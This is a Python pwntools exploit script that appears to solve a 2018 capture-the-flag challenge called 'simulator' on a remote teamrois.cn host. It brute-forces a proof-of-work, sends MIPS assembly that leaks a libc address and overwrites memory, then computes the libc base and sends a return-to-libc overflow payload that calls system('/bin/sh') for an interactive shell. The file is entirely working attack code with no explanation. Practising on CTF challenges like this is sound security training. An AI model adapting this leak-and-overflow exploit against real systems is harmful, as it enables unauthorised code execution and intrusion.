from pwn import *
from hashlib import sha256
import itertools

context.log_level='debug'
g_local=True
if g_local:
	e=ELF('/lib/i386-linux-gnu/libc-2.23.so')
	sh =process('./simulator')#env={'LD_PRELOAD':'./libc.so.6'}
	#gdb.attach(sh)
else:
	sh = remote("simulator.2018.teamrois.cn", 3131)
	e=ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
s=string.letters+string.digits
if not g_local:
	chal=sh.recv(16)
	for i in itertools.permutations(s,4):
		sol=''.join(i)
		if sha256(chal + sol).digest().startswith('\0\0\0'):
			break
	sh.send(sol)

mips = '''
.text
li $t0,2155911685
lw $a0,$t0
li $v0,1
syscall
li $t0,2155911683
li $t2,134523568
sw $t2,$t0
END
'''
binsh = e.search("/bin/sh\x00").next()
print hex(binsh)
sh.send(mips)
leak = sh.recvuntil("leave a comment: ")
leak = leak[leak.find("-"):]
leak = leak[:leak.find("\n")]
eof_addr = (int(leak, 10) & 0xffffffff)
print hex(eof_addr)
# ./find feof 810
# ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)

libc_base = eof_addr - e.symbols["feof"]
print hex(libc_base)

sh.send("A" * 0x30 + p32(libc_base + e.symbols["system"]) + "AAAA" + p32(libc_base + binsh) + "\n")
sh.interactive()
